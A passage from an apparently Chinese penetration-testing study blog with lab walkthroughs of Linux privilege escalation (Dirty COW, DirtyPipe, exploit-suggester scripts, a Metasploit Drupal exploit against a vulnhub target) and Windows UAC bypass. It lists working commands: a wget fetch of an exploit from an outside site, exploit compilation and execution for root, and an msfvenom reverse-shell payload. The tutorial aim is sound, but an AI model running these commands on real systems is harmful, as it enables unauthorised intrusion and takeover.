id="上传探针脚本"><a href="#上传探针脚本" class="headerlink" title="上传探针脚本"></a>上传探针脚本</h6><h6 id="sh脚本"><a href="#sh脚本" class="headerlink" title="sh脚本"></a>sh脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423142631628.png" alt="image-20230423142631628"></p><h6 id="pl脚本"><a href="#pl脚本" class="headerlink" title="pl脚本"></a>pl脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423143115344.png" alt="image-20230423143115344"></p><h6 id="给权限"><a href="#给权限" class="headerlink" title="给权限"></a>给权限</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423142732889.png" alt="image-20230423142732889"></p><h6 id="les-sh脚本"><a href="#les-sh脚本" class="headerlink" title="les.sh脚本"></a>les.sh脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423143242248.png" alt="image-20230423143242248"></p><h6 id="pl脚本-1"><a href="#pl脚本-1" class="headerlink" title="pl脚本"></a>pl脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423143210017.png" alt="image-20230423143210017"></p><h6 id="都检测到了CVE-2017-16695-上传漏洞利用c源代码"><a href="#都检测到了CVE-2017-16695-上传漏洞利用c源代码" class="headerlink" title="都检测到了CVE-2017-16695,上传漏洞利用c源代码"></a>都检测到了CVE-2017-16695,上传漏洞利用c源代码</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423144812149.png" alt="image-20230423144812149"></p><h6 id="编译c语言文件"><a href="#编译c语言文件" class="headerlink" title="编译c语言文件"></a>编译c语言文件</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423145025128.png" alt="image-20230423145025128"></p><p>.&#x2F;exp运行，获得root权限</p><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423145143302.png" alt="image-20230423145143302"></p><h3 id="Linux-内核漏洞Web用户提权-探针-amp-利用-脏牛dcow"><a href="#Linux-内核漏洞Web用户提权-探针-amp-利用-脏牛dcow" class="headerlink" title="#Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛dcow"></a>#Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛dcow</h3><p>内核提权整个过程：（linux-exploit-suggester获取信息）</p><h5 id="vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG"><a href="#vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG" class="headerlink" title="vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG"></a><code>vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG</code></h5><p>内核漏洞提权过程：寻可用-下exp-上&#x2F;tmp-编译exp-执行(无权限用chmod)</p><ul><li><p>nmap 192.168.46.0&#x2F;24 （扫描网段查看存活主机）</p></li><li><p>nmap -p1-65535 192.168.46.144 （扫描端口找到了1819）</p></li><li><h6 id="MSF："><a href="#MSF：" class="headerlink" title="MSF："></a>MSF：</h6></li><li><p>search drupal</p></li><li><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p></li><li><p>set rhost 192.168.46.144</p></li><li><p>set rport 1898</p></li><li><p>run</p></li></ul><ol><li>upload &#x2F;root&#x2F;dcow.cpp &#x2F;tmp&#x2F;dcow.cpp</li><li>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil</li><li>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</li><li>.&#x2F;dcow</li><li>su root</li></ol><h6 id="找到这个cms的公开漏洞在MSF搜search-drupal上利用use-exploit-x2F-unix-x2F-webapp-x2F-drupal-drupalgeddon2，获得webshell权限"><a href="#找到这个cms的公开漏洞在MSF搜search-drupal上利用use-exploit-x2F-unix-x2F-webapp-x2F-drupal-drupalgeddon2，获得webshell权限" class="headerlink" title="找到这个cms的公开漏洞在MSF搜search drupal上利用use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2，获得webshell权限"></a>找到这个cms的公开漏洞在MSF搜search drupal上利用use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2，获得webshell权限</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423145533209.png" alt="image-20230423145533209"></p><h6 id="上传探测漏洞脚本并赋权，进入shell会话"><a href="#上传探测漏洞脚本并赋权，进入shell会话" class="headerlink" title="上传探测漏洞脚本并赋权，进入shell会话"></a>上传探测漏洞脚本并赋权，进入shell会话</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423150429240.png" alt="image-20230423150429240"></p><h6 id="执行-x2F-les-sh，探测到脏牛漏洞"><a href="#执行-x2F-les-sh，探测到脏牛漏洞" class="headerlink" title="执行.&#x2F;les.sh，探测到脏牛漏洞"></a>执行.&#x2F;les.sh，探测到脏牛漏洞</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423150539921.png" alt="image-20230423150539921"></p><h6 id="上传脏牛的源码"><a href="#上传脏牛的源码" class="headerlink" title="上传脏牛的源码"></a>上传脏牛的源码</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423150636157.png" alt="image-20230423150636157"></p><h6 id="进入shell会话，进行编译"><a href="#进入shell会话，进行编译" class="headerlink" title="进入shell会话，进行编译"></a>进入shell会话，进行编译</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423150939369.png" alt="image-20230423150939369"></p><h6 id="x2F-dcow执行脚本"><a href="#x2F-dcow执行脚本" class="headerlink" title=".&#x2F;dcow执行脚本"></a>.&#x2F;dcow执行脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423151037794.png" alt="image-20230423151037794"></p><h6 id="新建连接"><a href="#新建连接" class="headerlink" title="新建连接"></a>新建连接</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423151132337.png" alt="image-20230423151132337"></p><h6 id="输入刚才的密码进行连接"><a href="#输入刚才的密码进行连接" class="headerlink" title="输入刚才的密码进行连接"></a>输入刚才的密码进行连接</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423151215512.png" alt="image-20230423151215512"></p><h6 id="登录成功"><a href="#登录成功" class="headerlink" title="登录成功"></a>登录成功</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423151237525.png" alt="image-20230423151237525"></p><h3 id="Linux-内核漏洞本地用户提权-探针-amp-利用-DirtyPipe（脏管道）"><a href="#Linux-内核漏洞本地用户提权-探针-amp-利用-DirtyPipe（脏管道）" class="headerlink" title="#Linux-内核漏洞本地用户提权-探针&amp;利用-DirtyPipe（脏管道）"></a>#Linux-内核漏洞本地用户提权-探针&amp;利用-DirtyPipe（脏管道）</h3><p>Dirty Pipe(CVE-2022-0847)</p><p>5.8&lt;&#x3D;Linux kernel&lt;5.16.11&#x2F;5.15.25&#x2F;5.10.102</p><ul><li>wget <a href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></li><li>gcc -o dirtypipez dirtypipez.c</li><li>.&#x2F;dirtypipez &#x2F;usr&#x2F;bin&#x2F;su  #具有 SUID 权限的可执行文件即可</li><li>id</li></ul><h6 id="上传这三个项目，本地用户可以直接上传目录，像Linux目录里的东西，wehshell只能一个个文件"><a href="#上传这三个项目，本地用户可以直接上传目录，像Linux目录里的东西，wehshell只能一个个文件" class="headerlink" title="上传这三个项目，本地用户可以直接上传目录，像Linux目录里的东西，wehshell只能一个个文件"></a>上传这三个项目，本地用户可以直接上传目录，像Linux目录里的东西，wehshell只能一个个文件</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423152120806.png" alt="image-20230423152120806"></p><h6 id="执行-x2F-les-sh，探针到了DirtyPipe漏洞"><a href="#执行-x2F-les-sh，探针到了DirtyPipe漏洞" class="headerlink" title="执行.&#x2F;les.sh，探针到了DirtyPipe漏洞"></a>执行.&#x2F;les.sh，探针到了DirtyPipe漏洞</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423152453388.png" alt="image-20230423152453388"></p><h6 id="用traitor也探针到了"><a href="#用traitor也探针到了" class="headerlink" title="用traitor也探针到了"></a>用traitor也探针到了</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423152532820.png" alt="image-20230423152532820"></p><h6 id="用beroot探针"><a href="#用beroot探针" class="headerlink" title="用beroot探针"></a>用beroot探针</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423152703270.png" alt="image-20230423152703270"></p><h6 id="还可以探针suid，第三方漏洞，配置漏洞等的综合脚本"><a href="#还可以探针suid，第三方漏洞，配置漏洞等的综合脚本" class="headerlink" title="还可以探针suid，第三方漏洞，配置漏洞等的综合脚本"></a>还可以探针suid，第三方漏洞，配置漏洞等的综合脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423153129903.png" alt="image-20230423153129903"></p><h6 id="这里也发现了DirtyPipe漏洞，远程下载漏洞利用exp"><a href="#这里也发现了DirtyPipe漏洞，远程下载漏洞利用exp" class="headerlink" title="这里也发现了DirtyPipe漏洞，远程下载漏洞利用exp"></a>这里也发现了DirtyPipe漏洞，远程下载漏洞利用exp</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423153612299.png" alt="image-20230423153612299"></p><h6 id="gcc编译执行后，因为-x2F-usr-x2F-bin-x2F-su有suid权限（其他任何具有-SUID-权限的可执行文件也可以），执行-x2F-dirtypipez-x2F-usr-x2F-bin-x2F-su获得root权限"><a href="#gcc编译执行后，因为-x2F-usr-x2F-bin-x2F-su有suid权限（其他任何具有-SUID-权限的可执行文件也可以），执行-x2F-dirtypipez-x2F-usr-x2F-bin-x2F-su获得root权限" class="headerlink" title="gcc编译执行后，因为&#x2F;usr&#x2F;bin&#x2F;su有suid权限（其他任何具有 SUID 权限的可执行文件也可以），执行.&#x2F;dirtypipez &#x2F;usr&#x2F;bin&#x2F;su获得root权限"></a>gcc编译执行后，因为&#x2F;usr&#x2F;bin&#x2F;su有suid权限（其他任何具有 SUID 权限的可执行文件也可以），执行.&#x2F;dirtypipez &#x2F;usr&#x2F;bin&#x2F;su获得root权限</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423153729538.png" alt="image-20230423153729538"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day102 权限提升-WIN本地用户&amp;BypassUAC&amp;DLL劫持&amp;引号路径&amp;服务权限</title>
    <link href="http://example.com/2023/04/17/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/"/>
    <id>http://example.com/2023/04/17/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/</id>
    <published>2023-04-17T02:36:53.000Z</published>
    <updated>2023-04-22T16:27:40.519Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422191848180.png" alt="image-20230422191848180"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、BypassUAC&amp;Dll劫持</p><p>2、不安全服务&amp;引号路径</p><h3 id="截至目前思路点总结如下："><a href="#截至目前思路点总结如下：" class="headerlink" title="#截至目前思路点总结如下："></a>#截至目前思路点总结如下：</h3><p>1.提权方法有部分适用在不同环境，当然也有通用方法</p><p>2.提权方法也有操作系统版本区分，特性决定方法利用面</p><p>3.提权方法有部分需要特定环境，如数据库,第三方提权等</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230423002728711.png" alt="image-20230423002728711"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="MSF中sessions命令使用-msf-session-小红帽Like大灰狼的博客-CSDN博客"><a href="#MSF中sessions命令使用-msf-session-小红帽Like大灰狼的博客-CSDN博客" class="headerlink" title="MSF中sessions命令使用_msf session_小红帽Like大灰狼的博客-CSDN博客"></a><a href="https://blog.csdn.net/qq_44624916/article/details/128077200">MSF中sessions命令使用_msf session_小红帽Like大灰狼的博客-CSDN博客</a></h4><h4 id="➢-Win7-amp-10-BypassUAC自动提权-MSF-amp-UACME"><a href="#➢-Win7-amp-10-BypassUAC自动提权-MSF-amp-UACME" class="headerlink" title="➢ Win7&amp;10-BypassUAC自动提权-MSF&amp;UACME"></a>➢ Win7&amp;10-BypassUAC自动提权-MSF&amp;UACME</h4><h4 id="➢-Win2012-DLL劫持提权应用配合MSF-FlashFXP"><a href="#➢-Win2012-DLL劫持提权应用配合MSF-FlashFXP" class="headerlink" title="➢ Win2012-DLL劫持提权应用配合MSF-FlashFXP"></a>➢ Win2012-DLL劫持提权应用配合MSF-FlashFXP</h4><h4 id="➢-Win2012-不带引号服务路径配合MSF-MacroExpert"><a href="#➢-Win2012-不带引号服务路径配合MSF-MacroExpert" class="headerlink" title="➢ Win2012-不带引号服务路径配合MSF-MacroExpert"></a>➢ Win2012-不带引号服务路径配合MSF-MacroExpert</h4><h4 id="➢-Win2012-不安全的服务权限配合MSF-NewServices"><a href="#➢-Win2012-不安全的服务权限配合MSF-NewServices" class="headerlink" title="➢ Win2012-不安全的服务权限配合MSF-NewServices"></a>➢ Win2012-不安全的服务权限配合MSF-NewServices</h4></blockquote><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422144235286.png" alt="image-20230422144235286"></p><h3 id="Win7-amp-10-BypassUAC自动提权-MSF-amp-UACME"><a href="#Win7-amp-10-BypassUAC自动提权-MSF-amp-UACME" class="headerlink" title="#Win7&amp;10-BypassUAC自动提权-MSF&amp;UACME"></a>#Win7&amp;10-BypassUAC自动提权-MSF&amp;UACME</h3><p>为了远程执行目标的exe或者bat可执行文件绕过此安全机制，以此叫BypassUAC</p><p>绕过项目：MSF内置(推荐)，Powershell渗透框架，UACME项目(推荐)</p><p>开启UAC和未开启UAC时,MSF默认getsystem提权影响(进程注入)</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.46.158  lport&#x3D;3333 -f exe -o msf.exe</p><h6 id="在没有开启之前成功获取system"><a href="#在没有开启之前成功获取system" class="headerlink" title="在没有开启之前成功获取system"></a>在没有开启之前成功获取system</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422144610914.png" alt="image-20230422144610914"></p><h6 id="开启之后获取system失败"><a href="#开启之后获取system失败" class="headerlink" title="开启之后获取system失败"></a>开启之后获取system失败</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422144728753.png" alt="image-20230422144728753"></p><h6 id="所以下面用到两个项目"><a href="#所以下面用到两个项目" class="headerlink" title="所以下面用到两个项目"></a>所以下面用到两个项目</h6><h5 id="1、MSF模块："><a href="#1、MSF模块：" class="headerlink" title="1、MSF模块："></a>1、MSF模块：</h5><ul><li><h6 id="Test-in-Win7-本地电脑-本地权限"><a href="#Test-in-Win7-本地电脑-本地权限" class="headerlink" title="-Test in Win7 本地电脑 本地权限"></a>-Test in Win7 本地电脑 本地权限</h6></li></ul><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassua</p><p>获取成功</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422144919377.png" alt="image-20230422144919377"></p><h6 id="Test-in-Win10-本地电脑-本地权限"><a href="#Test-in-Win10-本地电脑-本地权限" class="headerlink" title="-Test in Win10 本地电脑 本地权限"></a>-Test in Win10 本地电脑 本地权限</h6><h6 id="模块："><a href="#模块：" class="headerlink" title="模块："></a>模块：</h6><p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422145141293.png" alt="image-20230422145141293"></p><h6 id="获取失败"><a href="#获取失败" class="headerlink" title="获取失败"></a>获取失败</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422145349787.png" alt="image-20230422145349787"></p><h6 id="用刚才测试win7的模块use-exploit-x2F-windows-x2F-local-x2F-bypassua进行测试，也提示失败"><a href="#用刚才测试win7的模块use-exploit-x2F-windows-x2F-local-x2F-bypassua进行测试，也提示失败" class="headerlink" title="用刚才测试win7的模块use exploit&#x2F;windows&#x2F;local&#x2F;bypassua进行测试，也提示失败"></a>用刚才测试win7的模块use exploit&#x2F;windows&#x2F;local&#x2F;bypassua进行测试，也提示失败</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422145740521.png" alt="image-20230422145740521"></p><h6 id="所以用到use-exploit-x2F-windows-x2F-local-x2F-ask，前提是要管理员点这个是"><a 